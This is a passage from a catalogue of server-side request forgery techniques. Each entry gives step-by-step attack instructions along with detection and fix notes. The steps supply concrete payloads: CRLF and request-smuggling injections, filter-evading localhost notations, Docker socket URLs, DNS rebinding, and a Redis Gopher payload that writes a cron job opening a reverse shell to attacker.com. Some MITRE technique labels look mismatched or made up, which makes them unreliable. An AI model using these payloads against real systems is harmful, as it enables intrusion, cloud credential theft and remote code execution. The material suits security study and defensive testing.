- **Attack Steps**: Step 1: Find a feature that makes server-side HTTP requests — for example, a PDF generator, comment preview, or analytics feature. Step 2: Send a normal request while intercepting with Burp Suite or browser dev tools. Step 3: Modify the Referer: header to an internal IP address, e.g., Referer: http://127.0.0.1:8000/admin or http://169.254.169.254/latest/meta-data/. Step 4: Send the request and observe if the application fetches or reacts to internal resources (e.g., reflects internal content or causes delay/error). Step 5: If SSRF is working, you can chain this to access private dashboards, cloud metadata, or internal admin tools. Step 6: Monitor responses to infer successful fetch — e.g., "referrer not allowed", "timeout", or reflected metadata. Step 7: Combine with blind techniques (e.g., Interactsh) if no response. Step 8: Repeat with different internal IPs and ports to enumerate internal services.
- **Detection**: Analyze headers for internal IPs; log Referer header fetches; look for SSRF-like access attempts
- **Solution**: Do not trust client-supplied headers like Referer or Origin; use allowlists; validate all server-side requests
- **Tags**: SSRF, Header Injection, Referer, Metadata IP Access

## SSRF with CRLF Injection in URL

- **Attack Type**: SSRF by Breaking Headers Using Carriage Return & LF
- **Target**: Web proxies or redirect endpoints
- **Vulnerability**: CRLF injection causing request header manipulation
- **MITRE**: T1071 – Application Layer Protocol
- **Impact**: SSRF bypassing filters; access to metadata/cloud/headers
- **Tools**: Burp Suite, curl, custom CRLF payloads
- **Scenario**: SSRF filters may be bypassed using CRLF characters (%0d%0a) to inject headers or split requests, leading to header smuggling or cache poisoning with SSRF.
- **Attack Steps**: Step 1: Find a URL fetch or proxy feature — e.g., /proxy?url=https://target.com. Step 2: Inject CRLF characters like %0d%0aHost:169.254.169.254 into the url parameter. Example: /proxy?url=http://example.com%0d%0aHost:169.254.169.254. Step 3: If the backend uses vulnerable HTTP libraries, this may inject new headers into the outbound request. Step 4: Try injecting more complex payloads like %0d%0aAuthorization: Bearer FAKE, or even full request smuggling chains. Step 5: Monitor response timing and content. If different headers are respected, it may be SSRF via CRLF. Step 6: If cloud metadata or internal APIs are accessed, attacker can read secrets. Step 7: Combine with blind SSRF tracking using Interactsh or request bin to detect outbound requests. Step 8: Advanced: chain CRLF with gopher URLs to target Redis, etc.
- **Detection**: Look for CRLF chars in logs; inspect headers passed to internal fetchers; validate full URL structure
- **Solution**: Sanitize %0d, %0a from input; use built-in URL parsers; reject malformed or smuggled header requests
- **Tags**: SSRF, CRLF Injection, Header Smuggling

## SSRF with Response Smuggling

- **Attack Type**: SSRF using HTTP Response Smuggling
- **Target**: Reverse proxies (nginx, HAProxy)
- **Vulnerability**: Conflicting HTTP headers leading to request splitting
- **MITRE**: T1133 – External Remote Services
- **Impact**: Internal SSRF, cache poisoning, bypass auth
- **Tools**: Burp Suite, HTTP/2 tools, curl
- **Scenario**: Response smuggling tricks the proxy/backend into interpreting SSRF payloads as part of separate requests, leading to internal service access.
- **Attack Steps**: Step 1: Identify a reverse proxy (e.g., nginx, Apache) in front of backend servers. Test using tools like curl or by observing multiple Transfer-Encoding or Content-Length headers. Step 2: Send a request with conflicting headers: Transfer-Encoding: chunked and Content-Length: 0 to test if the proxy and backend disagree. Step 3: Craft a payload where the smuggled second request is an SSRF. For example, your first request might be a GET, but the smuggled second request is: GET /admin HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n. Step 4: If successful, you’ll get SSRF-level access to internal services — such as metadata, admin panels, or cloud APIs — via backend interpretation. Step 5: Use Burp Collaborator to detect blind exfiltration. Step 6: Observe differences in timing, headers, or errors to confirm. Step 7: Requires trial and error; ideal on CDN/reverse-proxied apps.
- **Detection**: Monitor anomalies in headers; detect mismatch in Transfer-Encoding/Content-Length; alert on split requests
- **Solution**: Use unified parsing rules across all proxies and backends; disable chunked+length header combos
- **Tags**: SSRF, Response Smuggling, Proxy Abuse

## SSRF via OpenAPI/Swagger API URL Parameters

- **Attack Type**: SSRF via Unprotected URL Fields in API Docs
- **Target**: OpenAPI/Swagger-enabled APIs
- **Vulnerability**: Missing validation of url field in API parameters
- **MITRE**: T1190 – Exploit Public-Facing App
- **Impact**: SSRF via internal/external OpenAPI routes
- **Tools**: Swagger Editor, Burp Suite, curl, browser
- **Scenario**: APIs generated with OpenAPI (Swagger) often include URL-based params (url=...) that are used without validation, leading to SSRF if exposed in dev/staging/prod.
- **Attack Steps**: Step 1: Visit /swagger.json or /api-docs endpoint of target site. Step 2: Look for parameters like "url": { "type": "string" } or endpoints like /fetch, /render, /preview?url=.... Step 3: Test those endpoints by inserting internal URLs like http://127.0.0.1:8000, http://localhost:9000/config, or http://169.254.169.254/. Step 4: If responses return metadata, headers, or internal HTML pages, SSRF is successful. Step 5: Often works in staging/dev APIs left open or auto-generated without access restrictions. Step 6: Can also include SSRF via POST JSON body: { "url": "http://internal-api" }. Step 7: Combine with swagger-ui “Try it out” feature to test SSRF from browser interface. Step 8: Automate testing with tools like SwaggerFuzzer or custom scripts.
- **Detection**: Scan OpenAPI specs for external-facing endpoints; monitor requests to internal IPs or metadata IP
- **Solution**: Never trust URL parameters in API requests; sanitize OpenAPI config and test endpoint security before deployment
- **Tags**: Swagger SSRF, OpenAPI Exploit, Dev API Abuse

## SSRF to Attack Redis Using Gopher

- **Attack Type**: SSRF to Internal Redis via Gopher
- **Target**: Internal Redis DB Server
- **Vulnerability**: SSRF without URL scheme restriction
- **MITRE**: T1190 – Exploit Public-Facing Application
- **Impact**: Redis manipulation, RCE, sensitive data overwrite
- **Tools**: Burp Suite, curl, SSRF toolkits, Gopher encode tool
- **Scenario**: Exploiting a vulnerable web application's SSRF capability to send crafted Gopher protocol payloads to access an internal Redis instance and write data
- **Attack Steps**: Step 1: Identify a web application that has a Server-Side Request Forgery (SSRF) vulnerability. This usually means the application allows the user to make URL requests on the backend server without filtering the destination (example: a file downloader, URL fetcher, or image previewer that takes a URL as input). Step 2: Confirm SSRF by making the server request internal services (e.g., http://127.0.0.1:80) and observing response differences (timeouts, error codes, or open port responses). Step 3: Check if the internal Redis service is running on default port 6379 by sending SSRF requests to 127.0.0.1:6379 or localhost:6379. Redis doesn't use HTTP, so you may get a broken response or an error — that’s expected. Step 4: Convert Redis CLI commands into Gopher protocol payloads. For example, to write a cron job using Redis keys, you prepare a Redis payload like: *3\r\n$3\r\nSET\r\n$9\r\ncronjob\r\n$34\r\n* * * * * /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1\r\n. Use online Gopher encoding tools or a Python script to encode this string into Gopher URL format. Step 5: The Gopher protocol allows sending raw TCP data — perfect for talking to Redis (which is TCP-based). Construct a full SSRF URL like: gopher://127.0.0.1:6379/_<encoded-payload> — this causes the backend to connect to Redis and send the raw command. Step 6: Send this Gopher SSRF payload to the vulnerable endpoint on the application (e.g., if the app has a URL fetcher at /fetch?url=, then visit /fetch?url=gopher://127.0.0.1:6379/_...). Step 7: If successful, Redis accepts the command as if a trusted internal client sent it. Depending on the payload, this can result in writing malicious keys, manipulating Redis data, or even gaining remote code execution if Redis is misconfigured (like having write access to /var/spool/cron/ via dir and dbfilename config changes). Step 8: Optionally, repeat the attack with payloads to create SSH keys, download and execute payloads, or exfiltrate sensitive keys stored in Redis (e.g., JWT secrets). Step 9: Cleanup may not be possible if Redis has no auth or logging; defenders may not detect unless they monitor unexpected traffic or behavior.
- **Detection**: Monitor unusual SSRF traffic patterns; analyze backend service request logs; scan for Gopher URL usage
- **Solution**: Block Gopher scheme, validate input URLs in SSRF endpoints, isolate Redis with strict firewalls and disable remote writes
- **Tags**: SSRF, Redis, Gopher, Internal Access, RCE

## SSRF via CDN Signed URL Bypass

- **Attack Type**: SSRF through CDN signed URLs that lack proper validation
- **Target**: CDN gateways, edge functions
- **Vulnerability**: Insecure or overly permissive signed URL parameters
- **MITRE**: T1190 – Exploit Public-Facing App
- **Impact**: Cloud metadata leak, SSRF through CDN edge request
- **Tools**: Burp Suite, curl, CDN config UI, browser dev tools
- **Scenario**: Content Delivery Networks (CDNs) often use signed URLs to protect resources. Misconfigurations can allow attackers to manipulate the destination and cause SSRF.
- **Attack Steps**: Step 1: Identify if the application uses a CDN with signed URLs. Look for links like https://cdn.example.com/resource.jpg?token=...&url=.... Step 2: Inspect parameters like url, redirect, or fetch within the CDN request. Some CDNs allow fetching external resources (e.g., images or videos) by signing a URL. Step 3: Modify the url parameter to an internal address like http://169.254.169.254/latest/meta-data/, keeping the token unchanged. Step 4: If no strict validation, the CDN may still fetch the internal resource using your tampered URL. Step 5: Use Interactsh or request-bin to test if DNS or HTTP requests are sent to internal or cloud services. Step 6: Successful fetch indicates SSRF via signed CDN URL. Step 7: You can now exfiltrate metadata, scan internal ports, or trigger internal APIs through the CDN.
- **Detection**: Monitor CDN fetch logs; check for internal IP patterns in url or query param logs
- **Solution**: Sign full URL including host; disallow internal/private IP targets in CDN fetchers
- **Tags**: SSRF, CDN Exploit, Signed URL, Metadata Access

## SSRF via SSRF Proxy Tool Injection

- **Attack Type**: SSRF Proxy chaining through internal SSRF tool exposed
- **Target**: Internal SSRF proxy services
- **Vulnerability**: SSRF chaining via proxy injection
- **MITRE**: T1210 – Exploitation of Remote Services
- **Impact**: Extended internal scanning, cloud secrets, Redis injection
- **Tools**: SSRFmap, Burp Suite, curl, HTTP tunneling tools
- **Scenario**: If SSRF proxy tools (like SSRFmap or httpbin) are accidentally exposed internally, attackers can use them to forward SSRF deeper into internal networks.
- **Attack Steps**: Step 1: Discover an SSRF proxy endpoint in the target app or infrastructure, e.g., /proxy?url=... or /fetch. These are often internal debugging or monitoring tools. Step 2: Replace the url parameter with the address of an SSRF tool hosted elsewhere internally or by the attacker (e.g., http://attacker.com:ssrfmap?target=169.254.169.254). Step 3: When the backend fetches the SSRF proxy, it executes the chained request to the final destination (like metadata IPs or localhost). Step 4: You now have a chain: App → SSRF proxy → internal service. Step 5: If successful, exfiltrated data will be sent back to your SSRF proxy logs. Step 6: You can automate with SSRFmap to scan ports, protocols (gopher, file), or access cloud creds. Step 7: Watch for timing differences or request headers in response to confirm internal fetches. Step 8: This method helps bypass filters that block direct access to internal hosts.
- **Detection**: Look for repeated proxy pattern requests, or internal IPs being accessed by app itself
- **Solution**: Remove SSRF proxies from production; restrict access to debug/internal tools
- **Tags**: SSRFmap, SSRF Chaining, Proxy Injection

## SSRF via OAuth Redirect URI Manipulation

- **Attack Type**: SSRF via manipulated OAuth redirect flow
- **Target**: OAuth login systems, identity flows
- **Vulnerability**: Improper validation of redirect_uri field
- **MITRE**: T1557 – Adversary-in-the-Middle
- **Impact**: SSRF into internal or cloud endpoints, token theft
- **Tools**: Burp Suite, OAuth debugger, browser redirect testing tools
- **Scenario**: OAuth login flows with misconfigured or dynamic redirect_uri fields can be abused to trigger SSRF from the provider or client side.
- **Attack Steps**: Step 1: Find an OAuth flow that allows you to set the redirect_uri parameter — either directly or through some app integration. Step 2: Modify the redirect_uri to an internal or sensitive address like http://127.0.0.1/admin or http://169.254.169.254/. Step 3: Use the full login URL and authenticate with any provider (e.g., Google, GitHub). Step 4: If the server or identity provider (IdP) follows your redirect blindly, it will issue a request to your chosen URL, causing SSRF. Step 5: Monitor the internal service's response to see if the OAuth flow was redirected to it (e.g., via logs or error responses). Step 6: You can exfiltrate credentials, trigger internal admin panels, or launch additional payloads. Step 7: Works best when the application does not validate redirect_uri strictly against a whitelist. Step 8: This can also lead to open redirect or full login bypass.
- **Detection**: Monitor OAuth flow logs for internal targets or repeated callback failures
- **Solution**: Enforce strict redirect_uri allowlists; don’t allow user-controlled URIs in auth flows
- **Tags**: OAuth Abuse, SSRF, Redirect URI Attack

## SSRF via HTTP Proxy Misconfiguration

- **Attack Type**: SSRF via backend trusting attacker-controlled proxy
- **Target**: Applications using HTTP clients
- **Vulnerability**: HTTP proxy env variables trusted by default
- **MITRE**: T1041 – Exfiltration Over C2 Channel
- **Impact**: Full control of outbound requests; internal data leak
- **Tools**: curl, proxychains, Burp Collaborator, env var injection tools
- **Scenario**: Backend services sometimes trust default or misconfigured HTTP proxy settings (HTTP_PROXY, HTTPS_PROXY) allowing SSRF via indirect request routing.
- **Attack Steps**: Step 1: Identify an application that fetches URLs on your behalf (e.g., screenshot generator, link preview, fetch proxy). Step 2: Try passing the HTTP_PROXY header or environment variable via request or via a file upload (e.g., YAML, JSON, or template file that gets parsed). Step 3: Set the proxy to an attacker-controlled server, like HTTP_PROXY: http://attacker.com:8080. Step 4: When the backend fetches a resource, it may send the request via your proxy, giving you control over the target and headers. Step 5: You can redirect requests to internal resources (e.g., 127.0.0.1, metadata IPs, Redis). Step 6: Capture requests on your malicious proxy and analyze headers, tokens, cookies, etc. Step 7: If it works, chain with SSRFmap to automate further scanning or exfiltration. Step 8: This bypasses most SSRF filters because the app believes it’s using a safe HTTP client — but the proxy routes it elsewhere.
- **Detection**: Monitor outgoing proxy usage; restrict outbound traffic; detect unauthorized proxy settings
- **Solution**: Don’t trust HTTP_PROXY, HTTPS_PROXY environment variables in backend apps; restrict outbound proxy configs
- **Tags**: SSRF, Proxy Injection, HTTP_PROXY Exploit

## SSRF via Third-Party Webhook Services

- **Attack Type**: SSRF via trusted external service with callback features
- **Target**: Apps integrated with webhooks
- **Vulnerability**: No restrictions on outbound callbacks or webhook URLs
- **MITRE**: T1190 – Exploit Public-Facing App
- **Impact**: Internal admin access, metadata theft, RCE trigger
- **Tools**: GitHub, Stripe, ngrok, Burp Suite, Interactsh
- **Scenario**: Some apps register webhooks to third-party services (e.g., Stripe, GitHub, Slack). If attackers can set the callback URL, they can point it to internal endpoints via SSRF.
- **Attack Steps**: Step 1: Find a webhook integration feature — e.g., the app lets users register webhooks to receive events like payment success, Git push, form submit, etc. Step 2: Register a webhook pointing to an internal IP or service like http://127.0.0.1:8000/admin or cloud metadata http://169.254.169.254/latest/meta-data. Step 3: When the third-party service triggers the webhook (e.g., after a Git push or payment), it sends a POST request to your specified URL. Step 4: If the application is hosted behind a NAT/firewall but can reach the internal host/IP, this request causes the app to SSRF itself or its network. Step 5: If internal services log requests or trigger behavior (e.g., log access, email alerts), observe those side effects. Step 6: Use tools like Interactsh to see if the metadata or headers leak. Step 7: Works best when the server cannot restrict outbound access and trusts the webhook sender. Step 8: This is indirect SSRF triggered by an external party.
- **Detection**: Log outbound requests; monitor third-party callbacks hitting internal IPs
- **Solution**: Filter or block internal IPs in webhook destination; use allowlists; inspect webhook URL schemas
- **Tags**: SSRF, Webhooks, Callback Abuse, Stripe Exploit

## SSRF to Trigger SSRF in Another App (Relay)

- **Attack Type**: SSRF Relay chaining into a secondary internal service
- **Target**: Internal API-connected microservices
- **Vulnerability**: Indirect SSRF via trusted app chaining
- **MITRE**: T1550 – Use of Internal Resources
- **Impact**: Access segmented networks, multi-hop SSRF, metadata leak
- **Tools**: SSRFmap, Burp Suite, custom redirector, Interactsh
- **Scenario**: SSRF chaining allows attackers to trigger a second SSRF in another internal app via an exposed first app. Useful when direct SSRF is filtered.
- **Attack Steps**: Step 1: Identify App A with SSRF — it allows requesting any URL (e.g., /proxy?url=). Step 2: Find internal App B that also has a server-side fetch or SSRF vulnerable point (e.g., PDF generator, preview bot). Step 3: From App A, make a request to App B, sending a specially crafted payload — like a url=http://169.254.169.254/. Step 4: App B receives the SSRF-triggering URL and then itself fetches an internal target, causing a secondary SSRF. Step 5: Chain the two together so that App A becomes a middle relay to hit targets unreachable from the attacker’s external IP. Step 6: Observe the side effects (e.g., leaked metadata, DNS logs, slow responses) to confirm the chained SSRF. Step 7: This is powerful in segmented networks where only App A can reach App B, and App B can reach the internal service. Step 8: Combine with blind SSRF tools (Interactsh, DNSBin) to detect the final stage.
- **Detection**: Monitor sequential internal requests; log outgoing HTTP chains between services
- **Solution**: Block SSRF on all services, not just edge apps; validate redirect/fetch targets; isolate internal services
- **Tags**: SSRF Relay, Multi-Hop SSRF, Chained Exploitation

## SSRF via SSRF in PDF Generator Sandbox

- **Attack Type**: SSRF inside file-based sandbox (PDF, image renderers)
- **Target**: PDF, Screenshot, Markdown renderers
- **Vulnerability**: Renderer engine fetches resources without validation
- **MITRE**: T1203 – Exploitation for Privilege Escalation
- **Impact**: Metadata exfiltration, PDF injection, command chaining
- **Tools**: wkhtmltopdf, HTML payloads, Burp, Interactsh, curl
- **Scenario**: PDF and image converters (e.g., wkhtmltopdf, headless Chrome) fetch embedded resources like images or CSS. Attackers abuse this to SSRF internal URLs.
- **Attack Steps**: Step 1: Find a feature that converts user content into a PDF or screenshot (e.g., invoice generator, report renderer). Step 2: Submit an HTML or Markdown file that includes a <img src="http://169.254.169.254/latest/meta-data/"> or <link href=...> to an internal IP. Step 3: When the server uses tools like wkhtmltopdf, PrinceXML, or Chromium to render your document, it will fetch the embedded internal URL server-side. Step 4: You may see the metadata or internal HTML content rendered directly into the PDF. Step 5: If the result is binary or obfuscated, try base64 or inline script tricks to expose content. Step 6: If no output is returned, use Interactsh to confirm that a blind SSRF request was triggered. Step 7: This bypasses SSRF filtering because the fetch is done by the renderer, not the main app logic. Step 8: Works in reporting tools, Markdown-to-PDF, blog exports, resume builders.
- **Detection**: Monitor for internal IPs in fetch logs; inspect PDF/image rendering inputs
- **Solution**: Disallow external URLs in rendered content; isolate rendering engine; use allowlist of hostnames in HTML inputs
- **Tags**: SSRF, wkhtmltopdf Exploit, Renderer Injection

## SSRF via URL Schema Smuggling

- **Attack Type**: SSRF via encoded or nested URL schemes
- **Target**: Apps using url parameters
- **Vulnerability**: URL parser confusion, schema bypass, encoding tricks
- **MITRE**: T1190 – Exploit Public-Facing App
- **Impact**: SSRF bypass filters; full internal access; metadata theft
- **Tools**: Burp Suite, curl, SSRF Bypass Payload lists, browser
- **Scenario**: Bypasses SSRF filters by hiding protocols inside nested schemas or misparsed characters, e.g., http://user@127.0.0.1:80, http://169.254.169.254%2F..%2Fmetadata.
- **Attack Steps**: Step 1: Find a feature that makes requests based on a url parameter or JSON field. Example: /render?url=http://example.com. Step 2: Try bypassing SSRF filters using encoding tricks like http://127.0.0.1, http://[::1], or userinfo like http://user@169.254.169.254. Step 3: Use path smuggling: http://example.com@169.254.169.254/, which tricks naive parsers to think it's external while routing internally. Step 4: Try double URL encoding: %252F%252F169.254.169.254, or schema abuse like data:text/html,<iframe src='http://127.0.0.1'>. Step 5: Some apps strip only http://, so use ftp://, file://, or gopher:// to trigger SSRF via protocol smuggling. Step 6: Test these payloads via curl or Burp and observe backend behavior. Step 7: Use timing, error response, or reflected metadata to confirm if the SSRF bypass succeeded.
- **Detection**: Analyze URLs passed to server fetchers; monitor malformed/encoded scheme access attempts
- **Solution**: Use strict URL parsers; block internal/reserved IP ranges after decoding; normalize URLs before processing
- **Tags**: SSRF, URL Smuggling, Protocol Abuse

## SSRF via Filter Evasion (127.1, 0x7f000001)

- **Attack Type**: SSRF via alternative IP representations
- **Target**: Apps with IP-block-based filtering
- **Vulnerability**: Incomplete filter logic for localhost variants
- **MITRE**: T1040 – Network Traffic Capture
- **Impact**: Localhost access, admin panel fetch, log stealing
- **Tools**: Burp Suite, curl, IP converter tools
- **Scenario**: SSRF filters often block 127.0.0.1 but ignore other forms like 127.1, 2130706433, or hex/decimal/binary equivalents. Attackers use them to access localhost.
- **Attack Steps**: Step 1: Locate a parameter that fetches external URLs (e.g., GET /api?fetch=http://target.com). Step 2: Try replacing target.com with internal IP 127.0.0.1. If blocked, attempt evasion using alternative notations. Step 3: Examples include 127.1, localhost, 2130706433, 0x7f000001, 0177.0.0.1 (octal), and even decimal format of localhost. Step 4: These forms are interpreted as 127.0.0.1 by many programming languages (Python, Node.js, PHP, Go). Step 5: Send requests with each variation and observe behavior. If successful, the backend may fetch from itself or internal services. Step 6: Use Interactsh for blind SSRF or request responses to check if access was achieved. Step 7: Combine this trick with port changes (:80, :3000) to hit internal dashboards or admin panels. Step 8: Works best on misconfigured filters using simple string matching.
- **Detection**: Monitor for hex/octal/decimal IP formats; alert on unusual schema+host combinations
- **Solution**: Normalize and resolve all IPs before allowing; disallow loopback and internal ranges regardless of format
- **Tags**: SSRF, Localhost Evasion, Hex IP, Decimal IP

## SSRF via Chunked Encoding Payloads

- **Attack Type**: SSRF through chunked Transfer-Encoding requests
- **Target**: Reverse proxy-connected web apps
- **Vulnerability**: Improper chunked encoding parsing
- **MITRE**: T1131 – Exploitation of Web Servers
- **Impact**: SSRF through body smuggling, filter bypass
- **Tools**: curl, Burp Repeater, HTTP/1.1 chunked payload generator
- **Scenario**: Applications using reverse proxies or web servers may misparse chunked requests, allowing hidden SSRF requests within encoded bodies.
- **Attack Steps**: Step 1: Target an app that accepts POST or PUT requests with large payloads (file uploads, JSON bodies). Step 2: Craft a request using Transfer-Encoding: chunked header and manually split the body into HTTP chunked format. Step 3: Insert your SSRF payload inside one of the chunks — e.g., <img src="http://169.254.169.254/latest/meta-data/">. Step 4: Some reverse proxies (e.g., nginx, HAProxy) may incorrectly parse chunked data, passing it as a full URL fetch to backend logic. Step 5: Send the request and observe the output. If SSRF occurred, internal content may appear, or behavior may change (longer response time, redirect, metadata). Step 6: Works best when combined with internal renderers or template systems that fetch embedded data. Step 7: Also try sending malformed chunked body lengths or boundary fuzzing to bypass protections. Step 8: Use this method when SSRF payloads are blocked in plain requests.
- **Detection**: Inspect unusual Transfer-Encoding headers; validate chunked decoding logic on web server/backend layers
- **Solution**: Disable unsupported encodings; normalize input before passing to internal fetchers
- **Tags**: SSRF, Chunked Encoding, Transfer-Encoding Trick

## SSRF Exploiting Unrestricted Inbound Firewall

- **Attack Type**: SSRF leveraging apps with open inbound firewall rules
- **Target**: Cloud-hosted apps with SSRF vector
- **Vulnerability**: Open security groups allowing SSRF exploitation
- **MITRE**: T1595 – Active Scanning
- **Impact**: Full internal recon, data exfiltration, remote compromise
- **Tools**: Nmap, SSRFmap, Interactsh, AWS CLI
- **Scenario**: Apps in cloud environments (like AWS, GCP) with overly permissive security groups (e.g., 0.0.0.0/0) can be exploited via SSRF to attack services bound on internal ports.
- **Attack Steps**: Step 1: Identify a cloud-hosted application vulnerable to SSRF. The app itself may sit in a public VPC with a security group that allows inbound traffic from any source (e.g., 0.0.0.0/0). Step 2: Craft SSRF requests to internal services that are bound on private IPs or localhost, like http://172.31.0.2:8080. Step 3: Use the SSRF vector (e.g., image fetcher, URL previewer) to connect to internal services that shouldn't be exposed externally. Step 4: If the SSRF request hits, it can trigger actions on services like Elasticsearch, Jenkins, or Redis that are running without authentication. Step 5: Some may return data (visible SSRF), others may require blind validation via timing or DNS exfiltration. Step 6: SSRFmap can automate scanning via the SSRF vector and map internal services. Step 7: In unrestricted firewall setups, you can even rebind ports or force backend callbacks to attacker-controlled hosts. Step 8: Chain with metadata endpoints to escalate to cloud takeover.
- **Detection**: Monitor internal traffic to uncommon ports; log all egress requests with source service
- **Solution**: Apply principle of least privilege to firewall/Security Group rules; deny-all egress by default
- **Tags**: SSRF, Cloud Firewall Bypass, VPC Exploitation

## SSRF via Local UNIX Socket Access (http+unix://)

- **Attack Type**: SSRF using HTTP-over-UNIX socket
- **Target**: Apps with fetchers or proxies
- **Vulnerability**: SSRF to UNIX domain sockets
- **MITRE**: T1190 – Exploit Public-Facing Application
- **Impact**: Container control, Docker access, Kubernetes breach
- **Tools**: curl, Burp Suite, Postman with raw requests, SSRFmap
- **Scenario**: Many services like Docker, Redis, Kubernetes, and system daemons expose UNIX sockets (e.g., /var/run/docker.sock). SSRF may access these with http+unix:// URLs.
- **Attack Steps**: Step 1: Find a web feature that fetches URLs on your behalf, e.g., PDF generation, image fetch, or data fetcher. Step 2: Instead of a normal URL like http://example.com, craft a special SSRF payload using the HTTP+UNIX socket schema: http+unix://%2Fvar%2Frun%2Fdocker.sock/info (the socket path must be URL-encoded). Step 3: Send this crafted request to the SSRF endpoint. If the backend allows this schema, it will connect to the UNIX domain socket and try to send HTTP requests over it. Step 4: For example, /info or /containers/json on the Docker socket may respond with sensitive data or allow container control. Step 5: This works in environments using Go, Python (requests-unixsocket), Node.js, or Java frameworks that support UNIX transport. Step 6: Try known UNIX socket paths like /var/run/docker.sock, /run/k3s/k3s.sock, /var/run/dbus/system_bus_socket. Step 7: If the backend logs errors or returns internal service data, the SSRF was successful. Step 8: This is a powerful SSRF bypass when TCP socket filtering is in place but UNIX sockets are not filtered.
- **Detection**: Monitor for unusual encoded socket paths in requests; watch for UNIX URL scheme usage
- **Solution**: Reject requests with http+unix://; use schema whitelisting; run services without root if UNIX socket access is needed
- **Tags**: SSRF, UNIX Socket, Docker Abuse, http+unix SSRF

## SSRF via Dynamic DNS Tricks

- **Attack Type**: SSRF via subdomain changes after DNS resolution
- **Target**: Servers relying on domain validation
- **Vulnerability**: DNS resolution mismatch between client and server
- **MITRE**: T1071 – Application Layer Protocol
- **Impact**: SSRF bypassing hostname filters, metadata/IP access
- **Tools**: DNS server (e.g., DuckDNS, No-IP), Burp, Interactsh, dig
- **Scenario**: SSRF filters may validate domain name but not IP after resolution. Dynamic DNS tricks allow redirecting valid domains to internal IPs.
- **Attack Steps**: Step 1: Use a Dynamic DNS service like DuckDNS, No-IP, or even your own DNS server. Step 2: Create a domain like myserver.duckdns.org. Initially point this to a safe IP like 8.8.8.8. Step 3: Find an SSRF-vulnerable endpoint that checks URLs (e.g., /fetch?url=http://myserver.duckdns.org). Step 4: Submit the request when the domain resolves to the safe IP, passing frontend validation. Step 5: After the request is sent but before the DNS resolves server-side, change your domain’s DNS record to 169.254.169.254 (cloud metadata) or 127.0.0.1. Step 6: If the backend does not cache or revalidate DNS, the server will fetch the final resolved IP, resulting in SSRF. Step 7: You can also automate this by setting a short TTL (like 1 second) or using race condition tools. Step 8: Use Interactsh to monitor successful SSRF connections.
- **Detection**: Detect mismatched DNS records and final IPs; monitor fast-changing domain resolutions
- **Solution**: Use DNS pinning or resolve and verify IPs at request time; block domains resolving to internal/private IPs
- **Tags**: SSRF, Dynamic DNS, TTL Race, DNS Trick

## SSRF via SSRF Gadget Chain in Microservices

- **Attack Type**: Multi-stage SSRF using internal microservice behavior
- **Target**: Microservices architectures
- **Vulnerability**: Lack of input validation in internal API chains
- **MITRE**: T1550 – Use of Trusted Services
- **Impact**: Chained SSRF, internal pivoting, full internal recon
- **Tools**: SSRFmap, Interactsh, microservice recon tools
- **Scenario**: In microservice apps, an SSRF in one service may be chained into SSRF in another via trusted internal calls and reflection of data.
- **Attack Steps**: Step 1: Identify SSRF vulnerability in a public-facing microservice (Service A). This could be image fetch, preview, or some external request. Step 2: Through internal service discovery, determine that Service A connects to Service B using internal API calls. Step 3: Craft a payload to Service A that sends a crafted internal URL to Service B, such as http://169.254.169.254 or another internal endpoint. Step 4: If Service B trusts input from Service A, it will fetch or process this URL without verifying its destination, causing a second-level SSRF. Step 5: Observe chained requests by inspecting logs, timing delays, or using tools like Interactsh to confirm second-stage request. Step 6: This chaining can be expanded — e.g., Service A calls Service B, which invokes Service C, each adding functionality (file fetch, render, DNS resolve). Step 7: This bypasses edge validation and enables internal network pivoting through SSRF gadgets.
- **Detection**: Monitor cross-service HTTP requests; use trace headers; detect nested requests with changing hosts
- **Solution**: Validate and sanitize inter-service input; use egress filters between microservices; do not trust internal requests blindly
- **Tags**: SSRF, SSRF Gadget, Microservice Exploit, Pivot SSRF

## SSRF via Signed URL Validation Bypass

- **Attack Type**: SSRF using expired, replayed, or spoofed signed URLs
- **Target**: Applications using signed URL access
- **Vulnerability**: Signature doesn’t bind to host/IP
- **MITRE**: T1557 – Man-in-the-Middle via Trusted Component
- **Impact**: SSRF to internal files, metadata, or admin access
- **Tools**: curl, Burp, JWT.io, HMAC script, AWS pre-signed URLs
- **Scenario**: Some apps use signed URLs to securely fetch files. If signature is not bound to destination host, attacker can use them to SSRF internal services.
- **Attack Steps**: Step 1: Find a feature that accepts signed URLs for internal fetch — e.g., document viewer fetches https://cdn.example.com/file.pdf?sig=XYZ&exp=.... Step 2: Understand the structure — whether the signature covers the whole URL, including the domain, or only the path or file. Step 3: Modify the signed URL to point to internal resources like http://169.254.169.254/ or http://127.0.0.1:8080/admin, but reuse the same signature and path. Step 4: If the backend only checks the file path and signature but not the host, it may allow fetching internal content. Step 5: Use expired or replayed tokens to test if they still work — some systems skip validation under load or misconfigured caches. Step 6: If the server fetches your modified URL, you’ve bypassed signed URL protection. Step 7: Use Interactsh or observe PDF output, logs, or server responses to confirm SSRF success.
- **Detection**: Check signature logic; observe if altered signed URL fetches data; log failed signature verification
- **Solution**: Bind signature to full URL including host/IP; enforce HTTPS + expiration + referer checks
- **Tags**: SSRF, Signed URL Bypass, Token Abuse, CDN Tricks

## SSRF via Base64 Encoded URL Parameters

- **Attack Type**: SSRF via Obfuscated Input Parameters
- **Target**: Internal Services
- **Vulnerability**: Input filtering bypass via encoding
- **MITRE**: T1190 – Exploit Public-Facing Application
- **Impact**: Unauthorized internal access, sensitive info disclosure
- **Tools**: Burp Suite, curl, base64, HTTP proxy tools
- **Scenario**: Attackers use Base64-encoded URLs passed through GET or POST parameters to bypass input filters and trigger server-side HTTP requests to internal resources.
- **Attack Steps**: Step 1: Find a parameter in the web application that accepts user-controlled input in the form of a Base64-encoded string — often named something like url=, link=, image=, or fetch=, passed via GET or POST. An example request might look like this: https://target.com/fetch?url=aHR0cDovL2V4YW1wbGUuY29t (which is Base64 for http://example.com). Step 2: Decode the Base64 string using a tool like base64 -d or Burp Suite decoder to confirm it contains a URL. This confirms that the server decodes the string before using it to make a request. Step 3: Re-encode a malicious internal URL into Base64. For example, encode http://127.0.0.1:8080/admin using the base64 command or an online tool. The result will look like aHR0cDovLzEyNy4wLjAuMTo4MDgwL2FkbWlu. Step 4: Send this encoded payload back to the same endpoint, replacing the original URL in the parameter. The request becomes: https://target.com/fetch?url=aHR0cDovLzEyNy4wLjAuMTo4MDgwL2FkbWlu. Step 5: The backend server decodes the Base64 string and makes an HTTP request to the decoded URL. If internal access is allowed, the server will attempt to connect to 127.0.0.1:8080, allowing the attacker to probe internal services or restricted URLs (SSRF). Step 6: To verify this, you can encode 